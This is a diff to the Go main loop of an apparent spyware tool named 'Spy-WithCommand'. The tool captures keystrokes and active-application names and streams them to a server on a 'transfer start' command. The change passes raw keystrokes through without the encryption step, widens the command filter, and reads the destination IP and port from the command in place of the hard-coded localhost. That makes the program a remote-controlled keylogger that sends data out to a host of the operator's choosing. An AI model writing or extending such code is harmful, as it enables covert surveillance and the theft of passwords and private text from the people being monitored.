@@ -8,6 +8,7 @@ import (
 	"github.com/mhthrh/Spy-WithCommand/Utils/CryptoUtil"
 	"github.com/mhthrh/Spy-WithCommand/Utils/NetUtil"
 	"regexp"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -29,20 +30,18 @@ func main() {
 		select {
 		case res := <-key:
 			fmt.Println("0987654321")
-			crypto.Text = res
 			KeyBoard.CK <- KeyBoard.KeyBoard{
-				Char:     crypto.Result,
+				Char:     res,
 				DateTime: time.Now(),
 			}
 		case res := <-app:
 			fmt.Println("1234567890")
-			crypto.Text = res
 			Application.CA <- Application.Application{
-				App:      crypto.Result,
+				App:      res,
 				DateTime: time.Now(),
 			}
 		case res := <-cmd:
-			reg, err := regexp.Compile("[^a-zA-Z0-9-]+")
+			reg, err := regexp.Compile("[^a-zA-Z0-9-:.]+")
 			if err != nil {
 				return
 			}
@@ -67,9 +66,14 @@ func main() {
 			if cmdS[0] == "transfer" {
 				if cmdS[1] == "start" {
 					start2 <- true
+
+					i, err := strconv.ParseInt(strings.Split(cmdS[2], ":")[1], 10, 64)
+					if err != nil {
+						return
+					}
 					go Transfer.Send2Server(&Transfer.Transfer{
-						Ip:   "localhost",
-						Port: 8585,
+						Ip:   strings.Split(cmdS[2], ":")[0],
+						Port: i,
 						CA:   &Application.CA,
 						CK:   &KeyBoard.CK,
 					}, &start2)
